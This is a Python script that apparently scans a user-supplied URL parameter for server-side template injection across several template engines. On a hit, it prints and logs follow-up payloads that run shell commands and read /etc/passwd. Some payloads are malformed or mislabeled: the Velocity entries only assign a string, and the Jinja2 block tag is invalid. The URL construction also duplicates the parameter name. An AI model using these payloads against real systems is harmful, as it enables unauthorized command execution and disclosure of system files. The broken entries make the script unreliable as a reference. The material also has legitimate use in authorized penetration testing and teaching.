import requests
from datetime import datetime

# Payloads for various template engines
payloads = [
    {"payload": "{{7*7}}", "engine": "Jinja2/Flask"},
    {"payload": "{% 7*7 %}", "engine": "Jinja2"},
    {"payload": "${7*7}", "engine": "Freemarker"},
    {"payload": "${{7*7}}", "engine": "Twig"},
    {"payload": "#{7*7}", "engine": "Ruby ERB"},
    {"payload": "${7*7}", "engine": "Velocity"},
    {"payload": "<%= 7*7 %>", "engine": "JSP"},
]

additional_payloads = {
    "Jinja2/Flask": [
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}",
        "{{ ''.__class__.__mro__[2].__subclasses__()[40]('ls').read() }}"
    ],
    "Freemarker": [
        "${freemarker.template.utility.Execute('cat /etc/passwd')}",
        "${freemarker.template.utility.Execute('ls')}"
    ],
    "Twig": [
        "{{ system('cat /etc/passwd') }}",
        "{{ system('ls') }}"
    ],
    "Ruby ERB": [
        "<%= `cat /etc/passwd` %>",
        "<%= `ls` %>"
    ],
    "Velocity": [
        "#set($str = 'class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\")')",
        "#set($str = 'class.forName(\"java.lang.Runtime\").getRuntime().exec(\"ls\")')"
    ],
    "JSP": [
        "<%= Runtime.getRuntime().exec('cat /etc/passwd') %>",
        "<%= Runtime.getRuntime().exec('ls') %>"
    ]
}

target_url = input("Enter target URL (e.g., http://example.com/page?param=): ")
param_name = input("Enter parameter name (e.g., param): ")

def send_request(url, param, payload):
    full_url = f"{url}{param}={payload}"
    response = requests.get(full_url)
    return response.text

def analyze_response(payload, response, engine):
    if "49" in response:
        print(f"Payload: {payload} - Possible SSTI detected with {engine}!")
        log_result(payload, "Possible SSTI detected!", engine)
        provide_further_payloads(engine)
    else:
        print(f"Payload: {payload} - No SSTI detected.")

def log_result(payload, status, engine):
    with open("ssti_test.log", "a") as log_file:
        log_file.write(f"{datetime.now()} - Payload: {payload} - Status: {status} - Engine: {engine}\n")

def provide_further_payloads(engine):
    if engine in additional_payloads:
        print(f"\nRecommended payloads for further testing with {engine}:")
        for ap in additional_payloads[engine]:
            print(f"  {ap}")
        log_further_payloads(engine)

def log_further_payloads(engine):
    with open("ssti_test.log", "a") as log_file:
        log_file.write(f"{datetime.now()} - Recommended payloads for {engine}:\n")
        for ap in additional_payloads[engine]:
            log_file.write(f"  {ap}\n")

def main():
    for entry in payloads:
        payload = entry["payload"]
        engine = entry["engine"]
        response = send_request(target_url, param_name, payload)
        analyze_response(payload, response, engine)

if __name__ == "__main__":
    main()
